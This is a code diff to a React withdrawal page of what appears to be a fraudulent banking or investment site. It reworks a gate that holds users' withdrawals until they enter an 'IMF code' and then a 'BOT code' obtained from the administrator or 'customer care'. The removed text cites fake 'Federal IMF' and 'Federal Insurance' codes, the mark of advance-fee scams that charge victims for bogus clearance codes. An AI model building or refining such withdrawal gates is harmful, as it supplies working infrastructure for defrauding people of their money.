@@ -1,13 +1,11 @@
 import React, { useState, useEffect, useContext } from 'react'
 import { AuthContext } from '../context/AuthContext'
 import { useLocation, useNavigate } from 'react-router-dom'
-import { useTheme } from '../context/ThemeContext'
 
 const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:5000/api'
 
 const Withdraw = () => {
-  const { user, token } = useContext(AuthContext)
-  const { theme } = useTheme()
+  const { token } = useContext(AuthContext)
   const [activeTab, setActiveTab] = useState('withdraw')
   const [withdrawAmount, setWithdrawAmount] = useState('')
   const [withdrawMethod, setWithdrawMethod] = useState('paypal')
@@ -40,13 +38,13 @@ const Withdraw = () => {
   const [showWithdrawalModal, setShowWithdrawalModal] = useState(false)
   const [selectedWithdrawal, setSelectedWithdrawal] = useState(null)
   
-  // VAT and BOT code verification states
-  const [showVatModal, setShowVatModal] = useState(false)
+  // IMF and BOT code verification states
+  const [showImfModal, setShowImfModal] = useState(false)
   const [showBotModal, setShowBotModal] = useState(false)
-  const [vatCode, setVatCode] = useState('')
+  const [imfCode, setImfCode] = useState('')
   const [botCode, setBotCode] = useState('')
   const [currentWithdrawalId, setCurrentWithdrawalId] = useState(null)
-  const [vatSubmitting, setVatSubmitting] = useState(false)
+  const [imfSubmitting, setImfSubmitting] = useState(false)
   const [botSubmitting, setBotSubmitting] = useState(false)
 
   const location = useLocation()
@@ -140,7 +138,7 @@ const Withdraw = () => {
         })
         setWithdrawHistory(data.withdrawals || [])
         
-        // Check for pending withdrawals that need VAT or BOT codes
+        // Check for pending withdrawals that need a BOT code
         checkPendingWithdrawals(data.withdrawals || [])
       } else {
         const errorData = await response.json()
@@ -155,16 +153,15 @@ const Withdraw = () => {
 
   const checkPendingWithdrawals = (withdrawals) => {
     // Find the most recent withdrawal that needs action
-    const pendingWithdrawal = withdrawals.find(w => 
-      w.status === 'imf_required' || w.status === 'bot_required'
+    const pendingWithdrawal = withdrawals.find(w =>
+      w.status === 'imf_required' || w.status === 'bot_required' || w.status === 'bot_pending'
     )
     
     if (pendingWithdrawal) {
       setCurrentWithdrawalId(pendingWithdrawal.id || pendingWithdrawal._id)
-      
       if (pendingWithdrawal.status === 'imf_required') {
-        setShowVatModal(true)
-      } else if (pendingWithdrawal.status === 'bot_required') {
+        setShowImfModal(true)
+      } else {
         setShowBotModal(true)
       }
     }
@@ -259,8 +256,9 @@ const Withdraw = () => {
       const data = await response.json()
 
       if (response.ok) {
-        setSuccess('The Federal IMF code is required for this transaction can be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the IMF code for this transaction.')
+        setSuccess('Your withdrawal request has been submitted. Enter your IMF code to continue.')
         setCurrentWithdrawalId(data.withdrawalRequest?.id || data.withdrawalRequest?._id || data.id)
+        setShowImfModal(true)
         setWithdrawAmount('')
         setBankDetails({ accountNumber: '', routingNumber: '', accountName: '' })
         // Reset payment details for the current method
@@ -283,15 +281,10 @@ const Withdraw = () => {
         }))
         // Refresh balance after successful withdrawal
         fetchBalance()
-        
-        // Show VAT modal after a short delay
-        setTimeout(() => {
-          setShowVatModal(true)
-        }, 3000)
       } else {
         setError(data.message || 'Withdrawal failed')
       }
-    } catch (err) {
+    } catch {
       setError('Network error. Please try again.')
     } finally {
       setLoading(false)
@@ -312,15 +305,15 @@ const Withdraw = () => {
     switch (status) {
       case 'completed': 
       case 'approved': return 'text-green-600 bg-green-100'
-      case 'pending': 
-      case 'imf_required': return 'text-yellow-600 bg-yellow-100'
-      case 'vat_pending': return 'text-orange-600 bg-orange-100'
+      case 'pending': return 'text-yellow-600 bg-yellow-100'
+      case 'imf_required': return 'text-orange-600 bg-orange-100'
+      case 'vat_pending':
+      case 'vat_rejected': return 'text-yellow-600 bg-yellow-100'
       case 'bot_required': return 'text-purple-600 bg-purple-100'
       case 'bot_pending': return 'text-indigo-600 bg-indigo-100'
       case 'processing': return 'text-blue-600 bg-blue-100'
       case 'failed': 
       case 'rejected':
-      case 'vat_rejected':
       case 'bot_rejected': return 'text-red-600 bg-red-100'
       case 'cancelled': return 'text-gray-600 bg-gray-100'
       default: return 'text-gray-600 bg-gray-100'
@@ -329,9 +322,9 @@ const Withdraw = () => {
 
   const getStatusDisplayText = (status) => {
     switch (status) {
-      case 'imf_required': return 'VAT Required'
-      case 'vat_pending': return 'VAT Pending'
-      case 'vat_rejected': return 'VAT Rejected'
+      case 'imf_required': return 'IMF Required'
+      case 'vat_pending':
+      case 'vat_rejected': return 'Pending'
       case 'bot_required': return 'BOT Required'
       case 'bot_pending': return 'BOT Pending'
       case 'bot_rejected': return 'BOT Rejected'
@@ -345,43 +338,39 @@ const Withdraw = () => {
     }
   }
 
-  // VAT Code submission
-  const submitVatCode = async () => {
-    if (!vatCode.trim()) {
-      setError('Please enter the VAT code')
+  const submitImfCode = async () => {
+    if (!imfCode.trim()) {
+      setError('Please enter the IMF code')
       return
     }
 
-    setVatSubmitting(true)
+    setImfSubmitting(true)
     setError('')
 
     try {
-      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/vat-code`, {
+      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/imf-code`, {
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${token}`,
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ vatCode: vatCode.trim() })
+        body: JSON.stringify({ imfCode: imfCode.trim() })
       })
 
       const data = await response.json()
 
       if (response.ok) {
-        setShowVatModal(false)
-        setVatCode('')
-        setSuccess('VAT code submitted successfully. Waiting for confirmation.')
-        // Refresh withdrawal history
-        if (activeTab === 'history') {
-          fetchWithdrawHistory()
-        }
+        setShowImfModal(false)
+        setImfCode('')
+        setShowBotModal(true)
+        setSuccess('IMF code submitted. Enter your BOT code to continue.')
       } else {
-        setError(data.message || 'Failed to submit VAT code')
+        setError(data.message || 'Failed to submit IMF code')
       }
-    } catch (err) {
+    } catch {
       setError('Network error. Please try again.')
     } finally {
-      setVatSubmitting(false)
+      setImfSubmitting(false)
     }
   }
 
@@ -410,7 +399,7 @@ const Withdraw = () => {
       if (response.ok) {
         setShowBotModal(false)
         setBotCode('')
-        setSuccess('BOT code submitted successfully. Your withdrawal will be processed shortly.')
+        setSuccess('BOT code verified. Your withdrawal is now being processed.')
         // Refresh withdrawal history
         if (activeTab === 'history') {
           fetchWithdrawHistory()
@@ -418,7 +407,7 @@ const Withdraw = () => {
       } else {
         setError(data.message || 'Failed to submit BOT code')
       }
-    } catch (err) {
+    } catch {
       setError('Network error. Please try again.')
     } finally {
       setBotSubmitting(false)
@@ -1103,56 +1092,48 @@ const Withdraw = () => {
           </div>
         )}
 
-        {/* VAT Code Modal */}
-        {showVatModal && (
+        {/* IMF Code Modal */}
+        {showImfModal && (
           <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
             <div className="bg-white rounded-lg shadow-xl max-w-md w-full mx-4">
               <div className="p-6">
-                <div className="flex items-center justify-center mb-4">
-                  <div className="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
-                    <svg className="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m0 0v2m0-2h2m-2 0H10m2-8V7a2 2 0 00-2-2H8a2 2 0 00-2 2v2"></path>
-                    </svg>
-                  </div>
-                </div>
-                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">VAT Code is required.</h3>
+                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">IMF Code Required</h3>
                 <p className="text-sm text-gray-600 text-center mb-6">
-                  The VAT code is required for this transaction to be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the VAT code for this transaction.
+                  Enter the IMF verification code provided by the administrator.
                 </p>
-                
+
                 <div className="mb-4">
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter VAT Code:</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter IMF Code:</label>
                   <input
                     type="text"
-                    value={vatCode}
-                    onChange={(e) => setVatCode(e.target.value)}
-                    placeholder="••••••"
+                    value={imfCode}
+                    onChange={(e) => setImfCode(e.target.value)}
+                    placeholder="Enter IMF code"
                     className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                     maxLength="20"
                   />
                 </div>
-                
-                <p className="text-xs text-gray-500 text-center mb-6">
-                  We have security measures in place to safeguard your money because we are committed to providing you with a secure banking experience.
-                </p>
-                
+
+                {error && <p role="alert" className="mb-4 text-sm text-red-600">{error}</p>}
+
                 <div className="flex space-x-3">
                   <button
                     onClick={() => {
-                      setShowVatModal(false)
-                      setVatCode('')
+                      setShowImfModal(false)
+                      setImfCode('')
+                      setError('')
                     }}
                     className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
-                    disabled={vatSubmitting}
+                    disabled={imfSubmitting}
                   >
                     Cancel
                   </button>
                   <button
-                    onClick={submitVatCode}
-                    disabled={vatSubmitting || !vatCode.trim()}
+                    onClick={submitImfCode}
+                    disabled={imfSubmitting || !imfCode.trim()}
                     className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
                   >
-                    {vatSubmitting ? 'Verifying...' : 'Verify'}
+                    {imfSubmitting ? 'Verifying...' : 'Continue'}
                   </button>
                 </div>
               </div>
@@ -1172,9 +1153,9 @@ const Withdraw = () => {
                     </svg>
                   </div>
                 </div>
-                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">BOT is Required.</h3>
+                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">BOT Code Required</h3>
                 <p className="text-sm text-gray-600 text-center mb-6">
-                  The Federal Insurance code is required for this transaction can be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the BOT code for this transaction.
+                  Enter the BOT verification code provided by the administrator.
                 </p>
                 
                 <div className="mb-4">
@@ -1188,6 +1169,8 @@ const Withdraw = () => {
                     maxLength="20"
                   />
                 </div>
+
+                {error && <p role="alert" className="mb-4 text-sm text-red-600">{error}</p>}
                 
                 <p className="text-xs text-gray-500 text-center mb-6">
                   We have security measures in place to safeguard your money because we are committed to providing you with a secure banking experience.
@@ -1276,15 +1259,6 @@ const Withdraw = () => {
                         {typeof selectedWithdrawal.paymentDetails === 'string' 
                           ? selectedWithdrawal.paymentDetails 
                           : JSON.stringify(selectedWithdrawal.paymentDetails, null, 2)}
-                      </p>
-                    </div>
-                  )}
-                  
-                  {selectedWithdrawal.vatCode && (
-                    <div>
-                      <label className="block text-sm font-medium text-gray-700 mb-1">VAT Code</label>
-                      <p className="text-sm text-gray-900 font-mono bg-gray-50 p-2 rounded">
-                        {selectedWithdrawal.vatCode}
                       </p>
                     </div>
                   )}
